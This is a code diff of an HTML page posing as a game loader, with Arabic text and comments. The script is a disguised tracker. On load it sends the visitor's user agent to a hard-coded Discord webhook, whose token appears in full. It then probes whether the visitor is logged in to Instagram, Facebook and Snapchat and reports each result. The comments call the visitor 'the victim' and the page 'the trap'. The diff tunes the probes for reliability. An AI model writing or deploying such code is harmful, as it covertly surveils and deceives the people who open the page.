@@ -4,52 +4,22 @@
     <meta charset="UTF-8">
     <title>تحميل اللعبة...</title>
     <style>
-        body { 
-            background: #000; 
-            color: #fff; 
-            display: flex; 
-            flex-direction: column;
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0;
-            overflow: hidden; 
-            font-family: sans-serif; 
-        }
-        .container { text-align: center; }
-        .loader { 
-            border: 4px solid #f3f3f3; 
-            border-top: 4px solid #3498db; 
-            border-radius: 50%; 
-            width: 50px; 
-            height: 50px; 
-            animation: spin 1s linear infinite; 
-            margin: 0 auto 20px; 
-        }
-        /* الرقم الكبير للتأكيد البصري */
-        .version-marker {
-            font-size: 80px;
-            font-weight: bold;
-            color: #1a1a1a; /* لون غامق عشان ما يشتت الضحية بس أنت تشوفه */
-            position: absolute;
-            top: 20px;
-            right: 20px;
-        }
+        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; font-family: sans-serif; }
+        .version-marker { font-size: 80px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="version-marker">1</div>
+    <div class="version-marker">2</div>
 
-    <div class="container">
+    <div class="container" style="text-align: center;">
         <div class="loader"></div>
-        <p style="font-size: 18px;">جاري تحميل محرك اللعبة، يرجى الانتظار...</p>
-        <p style="color: #444; font-size: 12px;">Build: 1.1.3-STABLE</p>
+        <p>جاري تحميل محرك اللعبة (V1.1.4)...</p>
     </div>
 
     <script>
-        // المعرف اللي بيوصل للديسكورد
-        const BUILD_ID = "Build_1"; 
+        const BUILD_ID = "Build_2_InstaFix"; 
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
         async function sendLog(service, status) {
@@ -62,36 +32,47 @@
                             title: `🚀 تحديث المصيدة | ${BUILD_ID}`,
                             description: `**الخدمة:** ${service}\n**الحالة:** ${status}`,
                             color: status.includes('✅') ? 3066993 : 15158332,
-                            timestamp: new Date().toISOString(),
-                            footer: { text: `ID: ${navigator.platform}` }
+                            timestamp: new Date().toISOString()
                         }]
                     })
                 });
             } catch (e) {}
         }
 
+        // دالة الفحص مع تايم آوت إجباري
         function probeService(name, url) {
             return new Promise((resolve) => {
+                let resolved = false;
                 const img = new Image();
-                img.onload = () => { sendLog(name, "✅ الضحية مسجل دخول"); resolve(true); };
-                img.onerror = () => { resolve(false); }; 
-                // منع التخزين المؤقت للصور
-                img.src = url + "?cachebuster=" + new Date().getTime();
-                setTimeout(() => resolve(false), 5000);
+
+                img.onload = () => { 
+                    if (!resolved) { sendLog(name, "✅ الضحية مسجل دخول"); resolved = true; resolve(); }
+                };
+                
+                img.onerror = () => { 
+                    if (!resolved) { sendLog(name, "❌ تعذر الوصول (غير مسجل أو محجوب)"); resolved = true; resolve(); }
+                };
+
+                // إذا المتصفح علق وما رد، نعتبرها فشل بعد 4 ثواني
+                setTimeout(() => {
+                    if (!resolved) { sendLog(name, "⚠️ تايم آوت (المتصفح حجب الطلب)"); resolved = true; resolve(); }
+                }, 4000);
+
+                img.src = url + "?cv=" + Math.random();
             });
         }
 
         async function startSilentMission() {
-            // إرسال معلومات النظام فور الدخول
+            // إرسال معلومات الجهاز
             await sendLog("System Discovery", "📱 " + navigator.userAgent);
 
-            // روابط انستا (Static Assets)
-            const instaPath = "https://static.cdninstagram.com/rsrc.php/v3/yt/r/30p_n4Y9pB8.png";
-            await probeService("Instagram", instaPath);
-
-            // فيسبوك وسناب
-            await probeService("Facebook", "https://www.facebook.com/favicon.ico");
-            await probeService("Snapchat", "https://www.snapchat.com/favicon.ico");
+            // تشغيل الفحوصات بالتوازي عشان لو واحد علق ما يخرب على الثاني
+            Promise.all([
+                // رابط انستا من جوجل (أكثر استقراراً)
+                probeService("Instagram", "https://www.google.com/s2/favicons?domain=instagram.com&sz=128"),
+                probeService("Facebook", "https://www.facebook.com/favicon.ico"),
+                probeService("Snapchat", "https://www.snapchat.com/favicon.ico")
+            ]);
         }
 
         window.onload = startSilentMission;
